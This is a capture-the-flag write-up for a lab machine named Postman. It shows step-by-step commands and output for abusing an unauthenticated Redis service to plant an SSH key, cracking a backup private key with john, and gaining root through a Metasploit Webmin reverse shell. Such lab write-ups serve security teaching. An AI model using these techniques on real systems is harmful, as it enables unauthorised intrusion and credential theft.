<center><h1>Postman</h1></center>
<br>
Start with an Nmap scan

```
# nmap -sV -sC -T4 -p- 10.10.10.160
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-05 18:04 EST
Nmap scan report for postman (10.10.10.160)
Host is up (0.063s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.24 seconds
```
So a few ports open. First I enumerated port 80 and didn't find anything useful. Next I checked out port 10000 and once there I had to add ```postman``` to my ```/etc/hosts``` file. Once that was done I refreshed the page and was greeted with a ```webmin``` login. Now I was not able to do anything more since every exploit requires valid credentials which I don't have. Lastly, was port 6379 with redis. First I try to connect using ```telnet``` to see if the service has any sort of authentication set and turns out it doesn't. next step was to install ```redis-tools``` so I could use the ```redis-cli``` to interact with the redis service. Once that was done I was able to find an exploit where I upload my own ssh keys to the server and use that to ssh into the system.
<br>
First step is to take my ssh key and copy it to a new file but at the same time generating some random data to the beginning and end of the file
```
# (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
```
Next step is to set the keys into the database. You should see and OK message
```
# cat key.txt | redis-cli -h 10.10.10.160 -p 6379 -x set bb
OK
```
Now I need to copy the ssh key into the .ssh folder but first I need to find where that is. Using the command below I see its located at ```/var/lib/redis/.ssh```.
```
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
```
Now I change into the directory
```
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
```
Then I change the name of the database to ```authorized_keys``` since this will be the name of out file. Then just save and exit.
```
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> exit
```
Now I can ssh in as the user ```redis``` from my host machine
```
# ssh -i id_rsa redis@10.10.10.160
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Nov  5 19:58:37 2019 from 10.10.14.19
redis@Postman:~$ whoami
```
Now doing some manual enumeration I found an ```id_rsa.bak``` file in ```/opt```. I copied this file to my host machine and saw that it was password protected. Using ```ssh2john``` I can convert the ssh key into a format that john and read and will crack the password for me.
```
# python ssh2john.py id_rsa.bak > id_rsa.hash
```
Now john cracks the hash in only a few seconds and I am given a password of ```computer2008```
```
# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa.bak)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:12 DONE (2019-11-05 15:33) 0.07818g/s 1121Kp/s 1121Kc/s 1121KC/sa6_123..*7¡Vamos!
Session completed
```
I tried to ssh in as the user ```Matt``` and ```root``` and niether worked so the only other thing I could think of was to use the password for the ```webmin``` login page. It ended up working as the username ```Matt``` and password ```computer2008```. Now since I have credentials, I can use one of the CVE's from earlier. I spin up metasploit and load in the module ```exploit/linux/http/webmin_packageup_rce```. After entering all the necessary info I type run and it spawns a shell. If I do a ```whoami``` I see that I am the user ```root```
```
msf5 exploit(linux/http/webmin_packageup_rce) > run

[*] Started reverse TCP handler on 10.10.14.39:4444 
[+] Session cookie: 3e1a4b0fabef10776fd267a6809f2f62
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.39:4444 -> 10.10.10.160:44420) at 2019-11-05 16:25:54 -0500

whoami
root
```
To give myself a better shell I will spawn myself a python tty shell
```
python -c 'import pty;pty.spawn("/bin/bash")'
root@Postman:/usr/share/webmin/package-updates/# cd
root@Postman:~#
```
From here I can read the user flag located at ```/home/Matt/user.txt```
```
root@Postman:~# cat /home/Matt/user.txt
517ad0ec2458ca****************
```
And the root flag from ```/root/root.txt```
```
root@Postman:~# cat root.txt
cat root.txt
a257741c5bed8be7**************
```
<br><br><br><br>
